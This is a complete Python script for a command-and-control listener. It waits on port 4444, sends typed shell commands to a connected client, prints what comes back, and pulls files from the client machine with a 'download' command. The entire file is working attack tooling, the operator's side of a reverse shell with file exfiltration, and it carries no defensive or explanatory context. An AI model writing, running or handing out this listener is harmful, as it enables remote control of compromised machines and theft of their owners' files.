#!/usr/bin/env python3
import socket
import os

BIND_IP = "0.0.0.0"  # Listen on all interfaces
BIND_PORT = 4444     # Change to your preferred port

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((BIND_IP, BIND_PORT))
    server.listen(1)
    print(f"[+] C2 Listener started on {BIND_IP}:{BIND_PORT}")

    client, addr = server.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")

    try:
        while True:
            cmd = input("C2> ").strip()
            if not cmd:
                continue

            client.send(cmd.encode())

            # Exit session
            if cmd.lower() == "exit":
                print("[*] Closing connection.")
                break

            # Download file (server <- client)
            elif cmd.startswith("download "):
                file_name = cmd.split(" ", 1)[1]
                with open(file_name, "wb") as f:
                    while True:
                        data = client.recv(4096)
                        if b"UPLOAD_COMPLETE" in data:
                            data = data.replace(b"UPLOAD_COMPLETE", b"")
                            if data:
                                f.write(data)
                            print(f"[+] Received {file_name}")
                            break
                        f.write(data)
            else:
                # Print command output
                response = client.recv(4096).decode()
                print(response)

    finally:
        client.close()
        server.close()

if __name__ == "__main__":
    start_listener()
